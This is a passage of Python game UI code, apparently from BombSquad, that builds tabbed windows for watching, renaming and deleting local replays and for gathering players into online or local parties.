        if self._transitioningOut:
            return
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if not self._modal:
            window = StoreWindow(
                transition='inLeft', modal=self._fromModalStore,
                backLocation=self._storeBackLocation).getRootWidget()
            if not self._fromModalStore:
                uiGlobals['mainMenuWindow'] = window
        self._transitioningOut = True


def _createTabButtons(parentWidget, tabs, pos, size, onSelectCall=None,
                      returnExtraInfo=False):

    tabPosV = pos[1]
    tabButtons = {}
    tabButtonsIndexed = []
    tabButtonWidth = float(size[0])/len(tabs)

    # add a bit more visual spacing as our buttons get narrower
    tabSpacing = (250.0-tabButtonWidth)*0.06

    positions = []
    sizes = []

    h = pos[0]
    for i, tab in enumerate(tabs):
        def _tickAndCall(call):
            bs.playSound(bs.getSound('click01'))
            onSelectCall(call)

        pos = (h+tabSpacing*0.5, tabPosV)
        size = (tabButtonWidth-tabSpacing, 50.0)
        positions.append(pos)
        sizes.append(size)
        b = bs.buttonWidget(
            parent=parentWidget, position=pos, autoSelect=True,
            buttonType='tab', size=size, label=tab[1],
            enableSound=False, onActivateCall=bs.Call(_tickAndCall, tab[0]))
        h += tabButtonWidth
        tabButtons[tab[0]] = b
        tabButtonsIndexed.append(b)
    if returnExtraInfo:
        return {'buttons': tabButtons, 'buttonsIndexed': tabButtonsIndexed,
                'positions': positions, 'sizes': sizes}
    else:
        return tabButtons


def _updateTabButtonColors(tabs, selectedTab):
    for tId, tButton in tabs.items():
        if tId == selectedTab:
            bs.buttonWidget(
                edit=tButton, color=(0.5, 0.4, 0.93),
                textColor=(0.85, 0.75, 0.95))  # lit
        else:
            bs.buttonWidget(
                edit=tButton, color=(0.52, 0.48, 0.63),
                textColor=(0.65, 0.6, 0.7))  # unlit


class TestWindow(Window):
    def __init__(self, transition='inRight'):
        self._width = 500
        self._height = 350

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition=transition, scale=1.8
            if gSmallUI else 1.6 if gMedUI else 1.4)

        self._backButton = backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(30, self._height - 54),
            size=(120, 50),
            scale=1.1, label=bs.Lstr(resource='backText'),
            buttonType='back', onActivateCall=self._back)

        scroll1 = bs.scrollWidget(
            parent=self._rootWidget, size=(440, 270),
            position=(40, 30),
            highlight=False)
        bs.containerWidget(edit=scroll1, claimsLeftRight=True)
        sc = bs.containerWidget(
            parent=scroll1, size=(400, 800),
            background=False)
        bs.widget(edit=sc, autoSelect=True)

        scroll2 = bs.hScrollWidget(
            parent=sc, size=(430, 200),
            position=(-5, 550),
            highlight=False, borderOpacity=0.3)
        bs.widget(edit=scroll2, showBufferTop=40,
                  showBufferBottom=40, autoSelect=True)
        bs.containerWidget(edit=scroll2, claimsLeftRight=True)
        sc2 = bs.containerWidget(
            parent=scroll2, size=(1200, 200),
            background=False)

        b1 = bs.buttonWidget(parent=sc, position=(20, 760), autoSelect=True)
        b1 = bs.buttonWidget(parent=sc, position=(20, 480), autoSelect=True)
        b2 = bs.buttonWidget(parent=sc, position=(30, 380), autoSelect=True)
        b3 = bs.buttonWidget(parent=sc, position=(40, 280), autoSelect=True)

        x = 10
        dx = 160
        for i in range(6):
            b = bs.buttonWidget(
                parent=sc2, position=(x, 25),
                autoSelect=True, size=(150, 150),
                buttonType='square', onActivateCall=bs.Call(
                    bs.screenMessage, "CLICK!"))
            bs.widget(edit=b, showBufferLeft=50, showBufferRight=50,
                      downWidget=b1, upWidget=self._backButton)
            x += dx

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = MainMenuWindow(
            transition='inLeft').getRootWidget()


class WatchWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        bsInternal._setAnalyticsScreen('Watch Window')

        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        global gMainWindow
        gMainWindow = "Watch"

        self._r = 'watchWindow'

        self._width = 1240 if gSmallUI else 1040
        xInset = 100 if gSmallUI else 0
        self._height = 578 if gSmallUI else 670 if gMedUI else 800
        self._current_tab = None
        extraTop = 20 if gSmallUI else 0

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + extraTop),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=1.3
            if gSmallUI else 0.97 if gMedUI else 0.8, stackOffset=(0, -10)
            if gSmallUI else(0, 15) if gMedUI else(0, 0))

        if gSmallUI and gToolbars:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._back)
            self._backButton = None
        else:
            self._backButton = backButton = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True,
                position=(70 + xInset, self._height - 74),
                size=(140, 60),
                scale=1.1, label=bs.Lstr(resource='backText'),
                buttonType='back', onActivateCall=self._back)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)
            if gDoAndroidNav:
                bs.buttonWidget(
                    edit=b, buttonType='backSmall', size=(60, 60),
                    label=bs.getSpecialChar('back'))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 38),
            size=(0, 0),
            color=gTitleColor, scale=1.5, hAlign="center", vAlign="center",
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=400)

        tabsDef = [['myReplays', bs.Lstr(resource=self._r+'.myReplaysText')]]

        scrollBufferH = 130 + 2*xInset
        tabBufferH = 750 + 2*xInset

        self._tab_buttons = _createTabButtons(
            self._rootWidget, tabsDef,
            pos=(tabBufferH * 0.5, self._height - 130),
            size=(self._width - tabBufferH, 50),
            onSelectCall=self._setTab)

        if gToolbars:
            bs.widget(
                edit=self._tab_buttons[tabsDef[-1][0]],
                rightWidget=bsInternal._getSpecialWidget('partyButton'))
            if gSmallUI:
                bb = bsInternal._getSpecialWidget('backButton')
                bs.widget(
                    edit=self._tab_buttons[tabsDef[0][0]],
                    upWidget=bb, leftWidget=bb)

        self._scrollWidth = self._width-scrollBufferH
        self._scrollHeight = self._height-180

        # not actually using a scroll widget anymore; just an image
        scrollLeft = (self._width-self._scrollWidth)*0.5
        scrollBottom = self._height-self._scrollHeight-79-48
        bufferH = 10
        bufferV = 4
        bs.imageWidget(
            parent=self._rootWidget,
            position=(scrollLeft - bufferH, scrollBottom - bufferV),
            size=(self._scrollWidth + 2 * bufferH, self._scrollHeight + 2 *
                  bufferV),
            texture=bs.getTexture('scrollWidget'),
            modelTransparent=bs.getModel('softEdgeOutside'))
        self._tabContainer = None

        self._restore_state()

    def _setTab(self, tab):

        if self._current_tab == tab:
            return
        self._current_tab = tab

        # we wanna preserve our current tab between runs
        bs.getConfig()['Watch Tab'] = tab
        bs.writeConfig()

        # update tab colors based on which is selected
        _updateTabButtonColors(self._tab_buttons, tab)

        if self._tabContainer is not None and self._tabContainer.exists():
            self._tabContainer.delete()
        scrollLeft = (self._width-self._scrollWidth)*0.5
        scrollBottom = self._height-self._scrollHeight-79-48

        # a place where tabs can store data to get cleared when
        # switching to a different tab
        self._tabData = {}

        def _simpleMessage(message, stringHeight):
            msgScale = 1.1
            cWidth = self._scrollWidth
            cHeight = min(self._scrollHeight, stringHeight*msgScale+100)
            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectable=False)
            bs.widget(edit=c, upWidget=self._tab_buttons[tab])

            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, cHeight * 0.5),
                color=(0.6, 1.0, 0.6),
                scale=msgScale, size=(0, 0),
                maxWidth=cWidth * 0.9, maxHeight=cHeight * 0.9, hAlign='center',
                vAlign='center', text=message)

        if tab == 'myReplays':
            cWidth = self._scrollWidth
            cHeight = self._scrollHeight-20
            sub_scroll_height = cHeight - 63
            self._myReplaysScrollWidth = sub_scroll_width = (
                680 if gSmallUI else 640)

            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)

            v = cHeight - 30
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=0.7, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(
                    resource='replayRenameWarningText',
                    subs=[('${REPLAY}', bs.Lstr(
                        resource='replayNameDefaultText'))]))

            bWidth = 140 if gSmallUI else 178
            bHeight = 107 if gSmallUI else 142 if gMedUI else 190
            bSpaceExtra = 0 if gSmallUI else -2 if gMedUI else -5

            bColor = (0.6, 0.53, 0.63)
            bTextColor = (0.75, 0.7, 0.8)
            bv = cHeight-(48 if gSmallUI else 45 if gMedUI else 40)-bHeight
            bh = 40 if gSmallUI else 40
            sh = 190 if gSmallUI else 225
            ts = 1.0 if gSmallUI else 1.2
            self._myReplaysWatchReplayButton = b1 = bs.buttonWidget(
                parent=c, size=(bWidth, bHeight),
                position=(bh, bv),
                buttonType='square', color=bColor, textColor=bTextColor,
                onActivateCall=self._onMyReplayPlayPress, textScale=ts,
                label=bs.Lstr(resource=self._r + '.watchReplayButtonText'),
                autoSelect=True)
            bs.widget(edit=b1, upWidget=self._tab_buttons[tab])
            if gSmallUI and gToolbars:
                bs.widget(
                    edit=b1, leftWidget=bsInternal._getSpecialWidget(
                        'backButton'))
            bv -= bHeight+bSpaceExtra
            b2 = bs.buttonWidget(
                parent=c, size=(bWidth, bHeight),
                position=(bh, bv),
                buttonType='square', color=bColor, textColor=bTextColor,
                onActivateCall=self._onMyReplayRenamePress, textScale=ts,
                label=bs.Lstr(resource=self._r + '.renameReplayButtonText'),
                autoSelect=True)
            bv -= bHeight+bSpaceExtra
            b3 = bs.buttonWidget(
                parent=c, size=(bWidth, bHeight),
                position=(bh, bv),
                buttonType='square', color=bColor, textColor=bTextColor,
                onActivateCall=self._onMyReplayDeletePress, textScale=ts,
                label=bs.Lstr(resource=self._r + '.deleteReplayButtonText'),
                autoSelect=True)

            v -= sub_scroll_height+23
            self._scrollWidget = sw = bs.scrollWidget(
                parent=c, position=(sh, v),
                size=(sub_scroll_width, sub_scroll_height))
            bs.containerWidget(edit=c, selectedChild=sw)
            self._columnWidget = bs.columnWidget(parent=sw, leftBorder=10)

            bs.widget(edit=sw, autoSelect=True, leftWidget=b1,
                      upWidget=self._tab_buttons[tab])
            bs.widget(edit=self._tab_buttons[tab], downWidget=sw)

            self._myReplaySelected = None
            self._refreshMyReplays()
        elif tab == 'sharedReplays':
            _simpleMessage((
                '(COMING SOON)\n'
                'This section will include replays that your friends\n'
                'have shared with you or possibly public replays\n'
                'from recent online tournaments, etc.'))
        elif tab == 'bestMoments':
            _simpleMessage((
                '(COMING SOON)\n'
                'This section will highlight short snippets of replays\n'
                'that people have shared, each only a few seconds long;\n'
                'awesome moves, random moments of hilarity, etc.'))

    def _noReplaySelectedError(self):
        bs.screenMessage(
            bs.Lstr(resource=self._r + '.noReplaySelectedErrorText'),
            color=(1, 0, 0))
        bs.playSound(bs.getSound('error'))

    def _onMyReplayPlayPress(self):
        if self._myReplaySelected is None:
            self._noReplaySelectedError()
            return

        bsInternal._incrementAnalyticsCount('Replay watch')

        def doIt():
            try:
                bsInternal._setReplaySpeedExponent(0)  # reset to normal speed
                bsInternal._fadeScreen(True)
                bsInternal._newReplaySession(
                    bsInternal._getReplaysDir()+'/'+self._myReplaySelected)
            except Exception:
                import bsMainMenu
                bs.printException("exception running replay session")
                # drop back into a fresh main menu session
                # in case we half-launched or something..
                bsInternal._newHostSession(bsMainMenu.MainMenuSession)
        bsInternal._fadeScreen(False, time=250, endCall=bs.Call(
            bs.pushCall, doIt))
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _onMyReplayRenamePress(self):
        if self._myReplaySelected is None:
            self._noReplaySelectedError()
            return
        cWidth = 600
        cHeight = 250
        self._myReplaysRenameWindow = c = bs.containerWidget(
            scale=1.8 if gSmallUI else 1.55 if gMedUI else 1.0,
            size=(cWidth, cHeight),
            transition='inScale')
        dName = self._getReplayDisplayName(self._myReplaySelected)
        bs.textWidget(
            parent=c, size=(0, 0),
            hAlign='center', vAlign='center', text=bs.Lstr(
                resource=self._r + '.renameReplayText',
                subs=[('${REPLAY}', dName)]),
            maxWidth=cWidth * 0.8, position=(cWidth * 0.5, cHeight - 60))
        self._myReplayRenameText = t = bs.textWidget(
            parent=c, size=(cWidth * 0.8, 40),
            hAlign='left', vAlign='center', text=dName, editable=True,
            description=bs.Lstr(resource=self._r + '.replayNameText'),
            position=(cWidth * 0.1, cHeight - 140),
            autoSelect=True, maxWidth=cWidth * 0.7, maxChars=200)
        cb = bs.buttonWidget(
            parent=c, label=bs.Lstr(resource='cancelText'),
            onActivateCall=bs.Call(
                bs.containerWidget, edit=c, transition='outScale'),
            size=(180, 60),
            position=(30, 30),
            autoSelect=True)
        okb = bs.buttonWidget(
            parent=c, label=bs.Lstr(resource=self._r + '.renameText'),
            size=(180, 60),
            position=(cWidth - 230, 30),
            onActivateCall=bs.Call(
                self._renameMyReplay, self._myReplaySelected),
            autoSelect=True)
        bs.widget(edit=cb, rightWidget=okb)
        bs.widget(edit=okb, leftWidget=cb)
        bs.textWidget(edit=t, onReturnPressCall=okb.activate)
        bs.containerWidget(edit=c, cancelButton=cb, startButton=okb)

    def _renameMyReplay(self, replay):
        try:
            if not self._myReplayRenameText.exists():
                return
            newNameRaw = bs.textWidget(query=self._myReplayRenameText)
            newName = newNameRaw+'.brp'
            # ignore attempts to change it to what it already is
            # (or what it looks like to the user)
            if (replay != newName
                    and self._getReplayDisplayName(replay) != newNameRaw):
                oldNameFull = (
                    bsInternal._getReplaysDir()+'/'+replay).encode('utf-8')
                newNameFull = (
                    bsInternal._getReplaysDir()+'/'+newName).encode('utf-8')
                if os.path.exists(newNameFull):
                    bs.playSound(bs.getSound('error'))
                    bs.screenMessage(
                        bs.Lstr(
                            resource=self._r +
                            '.replayRenameErrorAlreadyExistsText'),
                        color=(1, 0, 0))
                elif any(char in newNameRaw for char in ['/', '\\', ':']):
                    bs.playSound(bs.getSound('error'))
                    bs.screenMessage(
                        bs.Lstr(
                            resource=self._r + '.replayRenameErrorInvalidName'),
                        color=(1, 0, 0))
                else:
                    bsInternal._incrementAnalyticsCount('Replay rename')
                    os.rename(oldNameFull, newNameFull)
                    self._refreshMyReplays()
                    bs.playSound(bs.getSound('gunCocking'))
        except Exception:
            bs.printException(
                "error renaming replay '"+replay+"' to '"+newName+"'")
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.replayRenameErrorText'),
                color=(1, 0, 0))

        bs.containerWidget(edit=self._myReplaysRenameWindow,
                           transition='outScale')

    def _onMyReplayDeletePress(self):
        if self._myReplaySelected is None:
            self._noReplaySelectedError()
            return
        ConfirmWindow(
            bs.Lstr(
                resource=self._r + '.deleteConfirmText',
                subs=[('${REPLAY}', self._getReplayDisplayName(
                    self._myReplaySelected))]),
            bs.Call(self._deleteReplay, self._myReplaySelected),
            450, 150)

    def _getReplayDisplayName(self, replay):
        if replay.endswith('.brp'):
            replay = replay[:-4]
        if replay == '__lastReplay':
            return bs.Lstr(resource='replayNameDefaultText').evaluate()
        return replay

    def _deleteReplay(self, replay):
        try:
            bsInternal._incrementAnalyticsCount('Replay delete')
            os.remove((bsInternal._getReplaysDir()+'/'+replay).encode('utf-8'))
            self._refreshMyReplays()
            bs.playSound(bs.getSound('shieldDown'))
            if replay == self._myReplaySelected:
                self._myReplaySelected = None
        except Exception:
            bs.printException("exception deleting replay '"+replay+"'")
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.replayDeleteErrorText'),
                color=(1, 0, 0))

    def _onMyReplaySelect(self, replay):
        self._myReplaySelected = bs.uni(replay)

    def _refreshMyReplays(self):
        for c in self._columnWidget.getChildren():
            c.delete()
        tScale = 1.6
        try:
            names = os.listdir(bsInternal._getReplaysDir())
            # ignore random other files in there..
            names = [bs.uni(n) for n in names if n.endswith('.brp')]
            names.sort(key=lambda x: x.lower())
        except Exception:
            bs.printException("error listing replays dir")
            names = []

        for i, name in enumerate(names):
            t = bs.textWidget(
                parent=self._columnWidget,
                size=(self._myReplaysScrollWidth / tScale, 30),
                selectable=True, color=(1.0, 1, 0.4)
                if name == '__lastReplay.brp' else(1, 1, 1),
                alwaysHighlight=True, onSelectCall=bs.Call(
                    self._onMyReplaySelect, name),
                onActivateCall=self._myReplaysWatchReplayButton.activate,
                text=self._getReplayDisplayName(name),
                hAlign='left', vAlign='center', cornerScale=tScale,
                maxWidth=(self._myReplaysScrollWidth / tScale) * 0.93)
            if i == 0:
                bs.widget(edit=t, upWidget=self._tab_buttons['myReplays'])

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._backButton:
                selName = 'Back'
            elif sel in self._tab_buttons.values():
                selName = 'Tab:' + self._tab_buttons.keys()[
                    self._tab_buttons.values().index(sel)]
            elif sel == self._tabContainer:
                selName = 'TabContainer'
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = {
                'selName': selName, 'tab': self._current_tab}
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]['selName']
            except Exception:
                selName = None
            try:
                current_tab = bs.getConfig()['Watch Tab']
            except Exception:
                current_tab = None
            if current_tab is None or current_tab not in self._tab_buttons:
                current_tab = 'myReplays'
            self._setTab(current_tab)
            if selName == 'Back':
                sel = self._backButton
            elif selName == 'TabContainer':
                sel = self._tabContainer
            elif type(selName) is str and selName.startswith('Tab:'):
                sel = self._tab_buttons[selName.split(':')[-1]]
            else:
                if self._tabContainer is not None:
                    sel = self._tabContainer
                else:
                    sel = self._tab_buttons[current_tab]
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = MainMenuWindow(
            transition='inLeft').getRootWidget()


gShowedNetPlayWarning = False


class GatherWindow(Window):

    def __del__(self):
        bsInternal._setPartyIconAlwaysVisible(False)

    def __init__(self, transition='inRight', originWidget=None):

        bsInternal._setAnalyticsScreen('Gather Window')

        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        global gMainWindow
        gMainWindow = "Gather"

        bsInternal._setPartyIconAlwaysVisible(True)

        self._public_parties = {}

        self._width = 1240 if gSmallUI else 1040
        xOffs = 100 if gSmallUI else 0
        self._height = 582 if gSmallUI else 680 if gMedUI else 800
        self._current_tab = None
        extraTop = 20 if gSmallUI else 0

        self._r = 'gatherWindow'

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + extraTop),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=1.3
            if gSmallUI else 0.97 if gMedUI else 0.8, stackOffset=(0, -11)
            if gSmallUI else(0, 0) if gMedUI else(0, 0))

        if gSmallUI and gToolbars:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._back)
            self._backButton = None
        else:
            self._backButton = backButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(70 + xOffs, self._height - 74),
                size=(140, 60),
                scale=1.1, autoSelect=True, label=bs.Lstr(
                    resource='backText'),
                buttonType='back', onActivateCall=self._back)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)
            if gDoAndroidNav:
                bs.buttonWidget(
                    edit=b, buttonType='backSmall',
                    position=(70 + xOffs, self._height - 78),
                    size=(60, 60),
                    label=bs.getSpecialChar('back'))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 42),
            size=(0, 0),
            color=gTitleColor, scale=1.5, hAlign="center", vAlign="center",
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=550)

        platform = bs.getEnvironment()['platform']
        subplatform = bs.getEnvironment()['subplatform']

        tabsDef = [['about', bs.Lstr(resource=self._r+'.aboutText')]]
        if True and bsInternal._getAccountMiscReadVal(
                'enablePublicParties', True):
            tabsDef.append(['internet', bs.Lstr(
                resource=self._r+'.internetText')])
        if platform == 'android' and subplatform == 'google':
            tabsDef.append(['googlePlus', bs.Lstr(
                resource=self._r+'.googlePlayText')])
        tabsDef.append(['localNetwork', bs.Lstr(
            resource=self._r+'.localNetworkText')])

        tabsDef.append(['manual', bs.Lstr(resource=self._r+'.manualText')])

        scrollBufferH = 130 + 2*xOffs
        tabBufferH = 250 + 2*xOffs

        self._tab_buttons = _createTabButtons(
            self._rootWidget, tabsDef,
            pos=(tabBufferH * 0.5, self._height - 130),
            size=(self._width - tabBufferH, 50),
            onSelectCall=self._setTab)

        if gToolbars:
            bs.widget(
                edit=self._tab_buttons[tabsDef[-1][0]],
                rightWidget=bsInternal._getSpecialWidget('partyButton'))
            if gSmallUI:
                bs.widget(
                    edit=self._tab_buttons[tabsDef[0][0]],
                    leftWidget=bsInternal._getSpecialWidget('backButton'))

        self._scrollWidth = self._width-scrollBufferH
        self._scrollHeight = self._height-180

        # not actually using a scroll widget anymore; just an image
        scrollLeft = (self._width-self._scrollWidth)*0.5
        scrollBottom = self._height-self._scrollHeight-79-48
        bufferH = 10
        bufferV = 4
        bs.imageWidget(
            parent=self._rootWidget,
            position=(scrollLeft - bufferH, scrollBottom - bufferV),
            size=(self._scrollWidth + 2 * bufferH, self._scrollHeight + 2 *
                  bufferV),
            texture=bs.getTexture('scrollWidget'),
            modelTransparent=bs.getModel('softEdgeOutside'))
        self._tabContainer = None
        self._restore_state()

    def _showWarning(self):
        global gShowedNetPlayWarning
        if not gShowedNetPlayWarning:
            gShowedNetPlayWarning = True
            env = bs.getEnvironment()
            if not env['debugBuild']:
                ConfirmWindow(
                    bs.Lstr(resource=self._r + '.inDevelopmentWarningText'),
                    color=(0.7, 1.0, 0.7),
                    width=500, height=205, cancelButton=False)

    def _onGooglePlayShowInvitesPress(self):
        if (bsInternal._getAccountState() != 'SIGNED_IN'
                or bsInternal._getAccountType() != 'Google Play'):
            showSignInPrompt('Google Play')
        else:
            bsInternal._showInvitesUI()

    def _onGooglePlayInvitePress(self):

        if (bsInternal._getAccountState() != 'SIGNED_IN'
                or bsInternal._getAccountType() != 'Google Play'):
            showSignInPrompt('Google Play')
        else:
            # if there's google play people connected to us, inform the user
            # that they will get disconnected.. otherwise just go ahead..
            googlePlayerCount = bsInternal._getGooglePlayPartyClientCount()
            if googlePlayerCount > 0:
                ConfirmWindow(
                    bs.Lstr(
                        resource=self._r + '.googlePlayReInviteText',
                        subs=[('${COUNT}', str(googlePlayerCount))]),
                    bs.Call(bs.realTimer, 200, bsInternal._invitePlayers),
                    width=500, height=150, okText=bs.Lstr(
                        resource=self._r + '.googlePlayInviteText'))
            else:
                bs.realTimer(100, bsInternal._invitePlayers)

    def _inviteToTryPress(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        doAppInvitesPress()

    def _setTab(self, tab):

        if self._current_tab == tab:
            return
        self._current_tab = tab

        # we wanna preserve our current tab between runs
        bs.getConfig()['Gather Tab'] = tab
        bs.writeConfig()

        # update tab colors based on which is selected
        _updateTabButtonColors(self._tab_buttons, tab)

        # (re)create scroll widget
        if self._tabContainer is not None and self._tabContainer.exists():
            self._tabContainer.delete()
        scrollLeft = (self._width-self._scrollWidth)*0.5
        scrollBottom = self._height-self._scrollHeight-79-48

        # a place where tabs can store data to get cleared when switching to
        # a different tab
        self._tabData = {}

        # so we can still select root level widgets with direction buttons
        def _simpleMessage(tab, message, stringHeight, includeInvite=False):
            msgScale = 1.1
            cWidth = self._scrollWidth
            cHeight = min(self._scrollHeight, stringHeight*msgScale+100)
            tryTickets = bsInternal._getAccountMiscReadVal(
                'friendTryTickets', None)
            if tryTickets is None:
                includeInvite = False
            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectable=True if includeInvite else False)
            bs.widget(edit=c, upWidget=self._tab_buttons[tab])

            t = bs.textWidget(
                parent=c,
                position=(cWidth * 0.5, cHeight *
                          (0.58 if includeInvite else 0.5)),
                color=(0.6, 1.0, 0.6),
                scale=msgScale, size=(0, 0),
                maxWidth=cWidth * 0.9, maxHeight=cHeight *
                (0.7 if includeInvite else 0.9),
                hAlign='center', vAlign='center', text=message)
            if includeInvite:
                t = bs.textWidget(
                    parent=c, position=(cWidth * 0.57, 35),
                    color=(0, 1, 0),
                    scale=0.6, size=(0, 0),
                    maxWidth=cWidth * 0.5, hAlign='right', vAlign='center',
                    flatness=1.0, text=bs.Lstr(
                        resource=self._r + '.inviteAFriendText',
                        subs=[('${COUNT}', str(tryTickets))]))
                bs.buttonWidget(
                    parent=c, position=(cWidth * 0.59, 10),
                    size=(230, 50),
                    color=(0.54, 0.42, 0.56),
                    textColor=(0, 1, 0),
                    label=bs.Lstr(
                        resource='gatherWindow.inviteFriendsText',
                        fallbackResource='gatherWindow.getFriendInviteCodeText'),
                    autoSelect=True, onActivateCall=bs.WeakCall(
                        self._inviteToTryPress),
                    upWidget=self._tab_buttons[tab])

        if tab == 'about':
            msg = bs.Lstr(
                resource=self._r + '.aboutDescriptionText',
                subs=[('${PARTY}', bs.getSpecialChar('partyIcon')),
                      ('${BUTTON}', bs.getSpecialChar('topButton'))])

            # let's not talk about sharing in vr-mode; its tricky to fit more
            # than one head in a VR-headset ;-)
            if not bs.getEnvironment()['vrMode']:
                msg = bs.Lstr(
                    value='${A}\n\n${B}', subs=[('${A}', msg), ('${B}', bs.Lstr(
                        resource=self._r
                        +'.aboutDescriptionLocalMultiplayerExtraText'))])

            _simpleMessage(tab, msg, 400, includeInvite=True)

        elif tab == 'googlePlus':
            cWidth = self._scrollWidth
            cHeight = 380
            bWidth = 250
            bWidth2 = 230
            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)
            imgSize = 100
            v = cHeight-30
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=1.3, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(
                    resource=self._r + '.googlePlayDescriptionText'))
            v -= 35
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=0.7, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(
                    resource=self._r + '.worksWithGooglePlayDevicesText'))
            v -= 125
            b = bs.buttonWidget(
                parent=c, label='',
                position=(cWidth*0.5-bWidth*0.5, v-bWidth*0.5),
                size=(bWidth, bWidth*0.9),
                buttonType='square',
                onActivateCall=self._onGooglePlayInvitePress,
                autoSelect=True, upWidget=self._tab_buttons[tab])
            bs.imageWidget(
                parent=c, position=(cWidth * 0.5 - imgSize * 0.5, v - 35),
                size=(imgSize, imgSize),
                drawController=b, texture=bs.getTexture('googlePlayGamesIcon'),
                color=(0, 1, 0))
            bs.textWidget(
                parent=c, text=bs.Lstr(
                    resource=self._r + '.googlePlayInviteText'),
                maxWidth=bWidth * 0.8, drawController=b, color=(0, 1, 0),
                flatness=1.0, position=(cWidth * 0.5, v - 60),
                scale=1.6, size=(0, 0),
                hAlign='center', vAlign='center')
            v -= 180
            bs.buttonWidget(
                parent=c, label=bs.Lstr(
                    resource=self._r + '.googlePlaySeeInvitesText'),
                color=(0.5, 0.5, 0.6),
                textColor=(0.75, 0.7, 0.8),
                autoSelect=True, position=(cWidth * 0.5 - bWidth2 * 0.5, v),
                size=(bWidth2, 60),
                onActivateCall=bs.Call(
                    bs.realTimer, 100, self._onGooglePlayShowInvitesPress))

        elif tab == 'internet':
            cWidth = self._scrollWidth
            cHeight = self._scrollHeight-20
            sub_scroll_height = cHeight - 85
            sub_scroll_width = 650
            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)
            v = cHeight - 30
            self._internetJoinText = t = bs.textWidget(
                parent=c, position=(cWidth * 0.5 - 245, v - 13),
                color=(0.6, 1.0, 0.6),
                scale=1.3, size=(200, 30),
                maxWidth=250, hAlign='left', vAlign='center',
                clickActivate=True, selectable=True, autoSelect=True,
                onActivateCall=bs.Call(
                    self._setInternetTab, 'join', playSound=True),
                text=bs.Lstr(
                    resource=self._r + '.joinPublicPartyDescriptionText'))
            bs.widget(edit=t, upWidget=self._tab_buttons[tab])
            self._internetHostText = t = bs.textWidget(
                parent=c, position=(cWidth * 0.5 + 45, v - 13),
                color=(0.6, 1.0, 0.6),
                scale=1.3, size=(200, 30),
                maxWidth=250, hAlign='left', vAlign='center',
                clickActivate=True, selectable=True, autoSelect=True,
                onActivateCall=bs.Call(
                    self._setInternetTab, 'host', playSound=True),
                text=bs.Lstr(
                    resource=self._r + '.hostPublicPartyDescriptionText'))
            bs.widget(edit=t, leftWidget=self._internetJoinText,
                      upWidget=self._tab_buttons[tab])
            bs.widget(edit=self._internetJoinText, rightWidget=t)

